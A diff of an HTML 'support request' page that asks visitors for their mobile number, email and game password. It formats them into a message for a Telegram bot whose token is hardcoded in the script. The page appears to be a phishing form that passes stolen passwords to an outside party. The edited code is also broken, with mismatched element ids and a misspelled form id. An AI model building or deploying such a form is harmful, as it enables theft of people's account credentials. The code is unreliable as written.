@@ -27,8 +27,8 @@
             <input type="tel" id="mobile" placeholder="📱 Mobile Number" required>
             <input type="email" id="email" placeholder="📧 Email Address" required>
             
-            <label for="user password">user password </label>
-            <input type="text" id="user password" placeholder="🆔 Enter Your game password" required>
+            <label for="userpassword">userpassword </label>
+            <input type="text" id="userpassword" placeholder="🆔 Enter Your game password" required>
             
             <textarea id="description" rows="5" placeholder="📝 Write Your Problem Here..." required></textarea>
 
@@ -43,16 +43,16 @@
     </div>
 
     <script>
-        document.getElementById("supportForm").addEventListener("submit", async function(e) {
+        document.getElementById("supportfrom").addEventListener("submit", async function(e) {
             e.preventDefault();
 
             const mobile = document.getElementById("mobile").value;
             const email = document.getElementById("email").value;
-            const customerId = document.getElementById("user password").value;
+            const userpassword = document.getElementById("user password").value;
             const description = document.getElementById("description").value;
 
             // टेलीग्राम मैसेज फ़ॉर्मेट
-            const telegramMessage = `🚨 New Support Request!\n\n📱 Mobile: ${mobile}\n✉️ Email: ${email}\n🆔 user password: ${user password}\n📝 Description: ${description}`;
+            const telegramMessage = `🚨 New Support Request!\n\n📱 Mobile: ${mobile}\n✉️ Email: ${email}\n🆔 userpassword: ${userpassword}\n📝 Description: ${description}`;
 
             // आपका नया टोकन और चैट आईडी यहाँ सेट कर दी गई है
             const botToken = "8823863994:AAFZH0qu7IGosBtHP2SGXXe5CfIYVurAC8A"; 
